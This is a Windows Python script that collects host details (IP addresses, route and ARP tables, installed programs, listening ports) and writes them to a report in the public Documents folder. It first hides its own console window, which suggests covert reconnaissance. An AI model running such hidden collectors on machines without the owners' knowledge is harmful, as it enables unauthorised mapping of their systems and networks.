import os
import platform
import socket
import subprocess
import psutil
import requests
import ctypes

def get_machine_name():
    return socket.gethostname()

def get_os_version():
    return platform.platform()

def get_ip_addresses():
    ip_list = []
    hostname = socket.gethostname()
    try:
        private_ip = socket.gethostbyname(hostname)
        ip_list.append({"type": "private", "ip": private_ip})
        interfaces = psutil.net_if_addrs()
        for interface, addrs in interfaces.items():
            for addr in addrs:
                if addr.family == socket.AF_INET:
                    ip_list.append({"interface": interface, "ip": addr.address})
    except Exception as e:
        ip_list.append({"error": str(e)})
    try:
        public_ip = requests.get("https://api64.ipify.org").text
        ip_list.append({"type": "public", "ip": public_ip})
    except Exception as e:
        ip_list.append({"public_ip_error": str(e)})
    return ip_list

def get_network_info():
    return {
        "route_table": subprocess.getoutput("route print"),
        "arp_table": subprocess.getoutput("arp -a")
    }

def get_installed_programs():
    try:
        installed_programs = subprocess.getoutput("wmic product get name")
        return [line.strip() for line in installed_programs.split("\n") if line.strip()]
    except Exception as e:
        return [str(e)]

def get_open_ports():
    open_ports = []
    try:
        netstat_output = subprocess.getoutput("netstat -ano")
        for line in netstat_output.split("\n"):
            if "LISTEN" in line:
                open_ports.append(line.strip())
    except Exception as e:
        open_ports.append(str(e))
    return open_ports

def write_to_file(data, filename="C:\\Users\\Public\\Documents\\sys_report.txt"):
    try:
        with open(filename, "w") as file:
            for key, value in data.items():
                file.write(f"{key}:\n")
                if isinstance(value, list):
                    for item in value:
                        file.write(f"  {item}\n")
                elif isinstance(value, dict):
                    for subkey, subvalue in value.items():
                        file.write(f"  {subkey}: {subvalue}\n")
                else:
                    file.write(f"  {value}\n")
                file.write("\n")
    except Exception:
        pass

def hide_console():
    try:
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    except:
        pass

def main():
    hide_console()
    system_info = {
        "Machine Name": get_machine_name(),
        "OS Version": get_os_version(),
        "IP Addresses": get_ip_addresses(),
        "Network Info": get_network_info(),
        "Installed Programs": get_installed_programs(),
        "Open Ports": get_open_ports(),
    }
    write_to_file(system_info)

if __name__ == "__main__":
    main()
